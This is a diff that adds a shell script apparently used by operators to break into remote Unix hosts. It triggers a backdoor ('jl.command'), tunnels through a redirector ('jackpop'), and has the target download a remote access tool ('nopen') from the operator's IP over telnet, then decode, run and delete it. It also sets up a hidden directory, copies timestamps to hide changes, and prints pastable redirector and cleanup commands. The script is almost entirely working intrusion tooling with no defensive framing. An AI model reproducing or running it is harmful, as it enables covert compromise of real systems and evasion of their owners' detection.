@@ -1,0 +1,228 @@
+#!/bin/sh
+COLOR_NORMAL="\\033[0;39m"
+SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
+COLOR_NOTE="\\033[0;34m"
+SETCOLOR_NOTE="echo -en $COLOR_NOTE"
+SYNTAX="<rem_ip> <loc_ip> <localport> <basedir> \\
+       <rat_file> [<jl_port>] [<worksubdir>] [<rat_port> [nosy] ]"
+DEFJLPORT=13
+PROG=`basename ${0}`
+usage () {
+    echo "
+Usage: [RA=redirector-address RP=redirector-port] $PROG \\
+       $SYNTAX
+ *  RA and RP required if redirecting JL with jackpop
+ *  jl is assumed to be in ./jl
+ *  jl_port defaults to $DEFJLPORT (arg required if next arg is used)
+ *  rat_port optional - default used if not given. BUT--if rat_port is
+      given and nopen is not being used, the final argument must be
+      nosy to send the older syntax up.
+
+   e.g. $PROG alice LOCALIP 32177 /usr pmgrd 10402 .advtags 33433
+   e.g. $PROG alice LOCALIP 32177 /usr pmgrd 10402 .advtags 33433 nosy
+   e.g. $PROG alice LOCALIP 32177 /usr pmgrd 10402 .advtags
+   e.g. $PROG alice LOCALIP 32177 /usr pmgrd 10402
+   e.g. $PROG alice LOCALIP 32177 /usr pmgrd
+
+NOTE: You may now pre-set any/all of the following environment
+      variables if using jackpop with $PROG (RA & RP required).
+
+For jl.command
+locally:            RA=redirector-address   RP=redirector-port
+
+For jackpop on      LP=same-as-RP           SA=your-source-IP
+redirector:         TA=target-address       TP=target-JL-port
+
+      If you do not set LP and/or SA, they will be determined
+      by the <jl_port> parameter and ifconfig. You will be prompted
+      for TA and TP if they are not already set.
+"
+    exit
+}
+
+case "${#}" in
+  0|1|2|3|4)
+    usage
+    ;;
+esac
+
+REMOTEIP=$1
+LOCALIP=$2
+LOCALPORT=$3
+BASEDIR=$4
+RAT_FILE=$5
+JLPORT=$6
+WORKSUBDIR=$7
+RAT_PORT=$8
+RAT_NAME=$9
+
+[ "$RAT_NAME" ] || RAT_NAME=nopen
+
+PLATFORM=`uname`
+if [ "$PLATFORM" = "Linux" ]; then
+  MINUSN=-n
+else
+  MINUSN=""
+fi
+
+if [ "$JLPORT" = "" ]; then
+  JLPORT=$DEFJLPORT
+fi
+if [ "$WORKSUBDIR" = "" ]; then
+  WORKSUBDIR=.advtags
+fi
+if [ "$RAT_PORT" != "" ]; then 
+  if [ $RAT_PORT -lt 1025 -o $RAT_PORT -gt 65535 ]; then
+    echo rat_port must be between 1025 and 65535, inclusive
+    echo ""
+    usage
+  fi
+  if [ "$RAT_NAME" = "nosy" ]; then
+    RAT_ARG="P=$RAT_PORT "
+  else
+    if [ "$RAT_NAME" = "nopen" ]; then
+	RAT_ARG="C=\"-l $RAT_PORT\" "
+	if [ ! "`../bin/noclient | grep '2\.5'`" = "" ] ; then
+	  RAT_ARG="C=\"-l $RAT_PORT\" "
+	fi
+    else
+	echo rat_name $RAT_NAME is not nosy or nopen
+	echo ""
+	usage
+    fi
+  fi
+else
+  RAT_ARG=""
+fi
+
+JACKPOP=0
+
+if [ ! "$RA" = "" ] || [ ! "$RP" = "" ] ; then
+    JACKPOP=1
+    if [ "$RA" = "" ] || [ "$RP" = "" ] ; then
+	echo "FATAL ERROR: Must have BOTH environment variables RA and RP set."
+	exit 1
+    fi
+    if [ ! "$RP" = "$JLPORT" ] ; then
+	echo "Shouldn't RP=JLPORT? 
+(you have RP=$RP and JLPORT=$JLPORT)"
+	echo $MINUSN "
+Hit ^C to abort and fix this or hit enter to continue
+(though that would most likely not work)."
+	read quitans
+    fi
+    if [ ! "$RA" = "$REMOTEIP" ] || [ ! "$RA" = "$LOCALIP" ] ; then
+	echo "Shouldn't RA=LOCALIP=REMOTEIP? (you have
+   RA=$RA, LOCALIP=$LOCALIP
+   and REMOTEIP=$REMOTEIP)"
+	echo $MINUSN "
+Hit ^C to abort and fix this or hit enter to continue
+(though that would most likely not work)."
+	read quitans
+    fi
+    if [ ! "$TA" ] ; then
+	DEFTARGETIP=`egrep "^Target IP:" /current/etc/opscript.txt | awk '{print $3}' | head -1`
+	echo $MINUSN "
+Enter the IP of your actual target you are redirecting
+through $REMOTEIP to get to (this is used here to echo
+a jackpop command to paste into your redirector): [$DEFTARGETIP]"
+	read TA
+	[ "$TA" ] || TA=$DEFTARGETIP
+    fi
+    echo ""
+    if [ ! "$TP" ] ; then
+	echo $MINUSN "
+Enter the actual target's JL trigger port (this is used here
+to echo a jackpop command to paste into your redirector): [$DEFJLPORT] "
+	read TP
+	[ "$TP" ] || TP=$DEFJLPORT
+    fi
+    if [ ! "$LP" ] ; then
+	LP=$RP
+    fi
+
+    LOCAL_IP_GUESS=`ifconfig ppp0 2>/dev/null | grep inet | grep -v grep | grep -v ":127\." | awk '{print $2}' | cut -d ":" -f 2`
+    # if that fails maybe it's on eth0
+    [ "$LOCAL_IP_GUESS" ] || LOCAL_IP_GUESS=`ifconfig -a eth0 | grep inet | grep -v grep | awk '{print $2}' | cut -d ":" -f 2`
+    [ "$LOCAL_IP_GUESS" ] || echo "Unable to get local IP address..bailing" 
+    [ "$LOCAL_IP_GUESS" ] || exit 1
+
+    if [ "$SA" ] ; then
+	if [ ! "$SA" = "$LOCAL_IP_GUESS" ] ; then
+	    echo "Shouldn't SA=LOCAL_IP_GUESS? (you have
+SA=$SA and the local IP appears to be
+$LOCAL_IP_GUESS."
+	    echo $MINUSN "
+Hit ^C to abort and fix this or hit enter to continue
+(though that would most likely not work)."
+	    read quitans
+	    
+	fi
+    else
+	SA=$LOCAL_IP_GUESS
+    fi
+fi
+
+echo "
+CommandLine: $PROG ${*}"
+
+REALCMD="N=/dev/null
+D=$BASEDIR/.advtags
+PATH=\$D:/bin:/usr/bin
+touch -r $BASEDIR /tmp/.advt
+mkdir \$D
+cd \$D
+(telnet $LOCALIP $LOCALPORT < /dev/console 2> /dev/null) | cat > $RAT_FILE.uu
+uudecode $RAT_FILE.uu
+uncompress -f $RAT_FILE.Z >\$N 2>&1 && chmod +x $RAT_FILE
+${RAT_ARG}${RAT_FILE}
+rm -f \$D/$RAT_FILE \$D/$RAT_FILE.uu
+exit 0" 
+
+export REALCMD
+
+echo ""
+echo ""
+echo "CHECK SYNTAX IN REALCMD AND IN jl.command LINE BEFORE CONTINUING"
+echo ""
+echo "New order of arguments is: "
+echo "$PROG $SYNTAX"
+echo ""
+
+echo "REALCMD=\"$REALCMD\""
+echo ""
+echo "Command about to be executed:"
+echo " ./jl.command telnet $REMOTEIP $JLPORT"
+echo ""
+
+if [ "$JACKPOP" = 1 ] ; then
+    echo "
+Using jackpop with environment variables as follows: 
+  Redirector Address	RA=$RA
+  Redirector Port	RP=$RP	
+  Target Address	TA=$TA
+  Target Port		TP=$TP
+  Listening Port on RA	LP=$LP	
+  Source Address	SA=$SA	
+
+Now, some pastables. First, the jackpop command you need to run in an
+INCISION window on $RA, then the -rtun command in a NOPEN window
+on the same box, and finally an rm command to wipe jackpop: "
+$SETCOLOR_NOTE
+    echo "
+ chmod 700 jp&&netstat -an|grep $LP||PATH=. SA=$SA TA=$TA TP=$TP LP=$LP jp
+
+ -rtun $LOCALPORT
+
+ rm jp ; ls -al ; ls -al jp
+"
+    $SETCOLOR_NORMAL
+fi
+echo "CHECK SYNTAX IN REALCMD AND IN jl.command LINE BEFORE CONTINUING"
+echo $MINUSN "hit enter to proceed, ^C to not: "
+
+read junk
+
+#now run jackladder
+
+./jl.command telnet $REMOTEIP $JLPORT
